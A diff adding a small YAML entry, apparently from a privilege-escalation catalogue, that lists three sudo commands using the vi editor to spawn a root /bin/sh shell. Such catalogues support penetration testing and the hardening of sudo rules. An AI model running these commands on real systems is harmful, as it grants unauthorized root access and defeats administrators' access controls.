@@ -1,0 +1,6 @@
+name: vi
+binary_path: /usr/bin/vi
+exploit_cmds:
+- sudo /usr/bin/vi -c ':!/bin/sh' /dev/null
+- sudo /usr/bin/vi -c ':set shell=/bin/sh | shell'
+- sudo /usr/bin/vi -c :terminal /bin/sh
